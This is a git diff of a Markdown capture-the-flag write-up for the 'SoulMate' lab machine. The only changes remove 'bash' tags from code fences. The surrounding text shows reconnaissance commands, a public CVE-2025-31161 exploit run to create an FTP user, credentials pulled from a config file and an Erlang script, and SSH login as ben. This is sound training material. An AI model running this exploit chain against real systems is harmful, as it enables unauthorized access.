@@ -27,7 +27,7 @@ SoulMate is an easy-difficulty Linux machine that demonstrates multiple security
 ### Port Scanning
 Initial `nmap` scan reveals two open ports
 
-```bash
+```
 nmap -sCV -oA nmap/Soulmate 10.129.218.10 
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-13 11:42 +0300
 Nmap scan report for 10.129.218.10
@@ -55,7 +55,7 @@ Nmap done: 1 IP address (1 host up) scanned in 23.17 seconds
 
 Added the domain to the hosts file:
 
-```bash
+```
 echo '10.129.218.10  soulmate.htb' | sudo tee -a /etc/hosts
 ```
 
@@ -74,7 +74,7 @@ After registering a user account and logging in, the application offers limited 
 
 Directory brute-forcing reveals standard PHP endpoints:
 
-```bash
+```
 ffuf -u http://soulmate.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -ic -e .php,.txt,.git
 <.....SNIP.....>
 index.php               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1659ms]
@@ -122,7 +122,7 @@ Using the public exploit from [Immersive Labs](https://github.com/Immersive-Labs
 ![img](Pasted image 20250909150824.png)
 **Exploitation**:
 
-```bash
+```
 python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --new_user null --password Pass123
 [+] Preparing Payloads
   [-] Warming up the target
@@ -214,7 +214,7 @@ class Database {
 
 **Credentials Found**: `admin:Crush4dmin990` (hashed, but the plaintext is visible in the code)
 
-```bash
+```
 www-data@soulmate:~/soulmate.htb/config$ ss -tunlp
 ss -tunlp
 Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                                 
@@ -243,8 +243,8 @@ Port 4369 is particularly interesting as it's associated with Erlang:
 
 After researching Erlang configuration locations, a script is found at `/usr/local/lib/erlang_login/`:
 
-```bash
- www-data@soulmate:/usr/local/lib/erlang_login$ ls -la
+```
+www-data@soulmate:/usr/local/lib/erlang_login$ ls -la
 ls -la
 total 16
 drwxr-xr-x 2 root root 4096 Aug 15 07:46 .
@@ -256,7 +256,7 @@ www-data@soulmate:/usr/local/lib/erlang_login$
 
 Examining `start.escript` reveals hardcoded credentials:
 
-```bash
+```
 ww-data@soulmate:/usr/local/lib/erlang_login$ cat s
 cat start.escript 
 #!/usr/bin/env escript
@@ -299,7 +299,7 @@ www-data@soulmate:/usr/local/lib/erlang_login$
 
 Using the newly discovered credentials:
 
-```bash
+```
 ssh ben@soulmate.htb
 The authenticity of host '10.129.129.97 (10.129.129.97)' can't be established.
 ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
